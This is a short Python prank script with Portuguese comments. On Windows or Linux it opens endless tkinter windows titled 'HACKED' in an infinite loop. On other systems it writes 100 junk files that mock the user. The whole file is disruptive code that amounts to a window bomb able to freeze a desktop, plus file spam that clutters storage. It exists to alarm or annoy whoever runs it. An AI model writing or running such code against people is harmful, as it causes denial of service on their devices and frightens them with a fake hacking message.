import os
import platform
import random
import time

sistema = platform.system()

if sistema == "Windows" or sistema == "Linux":
    # PC: abre janelas infinitas
    import tkinter as tk

    def explodir_pc():
        while True:
            x = random.randint(0, 1000)
            y = random.randint(0, 600)
            win = tk.Tk()
            win.geometry(f"200x100+{x}+{y}")
            win.title("💀 HACKED 💀")
            tk.Label(win, text="Você foi hackeado!").pack()
            win.update()

    explodir_pc()

else:
    # Provavelmente Android: spam de arquivos
    def zoar_celular():
        for i in range(100):
            nome = f"HACKED_{random.randint(1000,9999)}.txt"
            with open(nome, "w") as f:
                f.write("VOCÊ FOI ZOADO KKKKKK\n" * 50)
            print(f"Arquivo {nome} criado!")
            time.sleep(0.2)

    zoar_celular()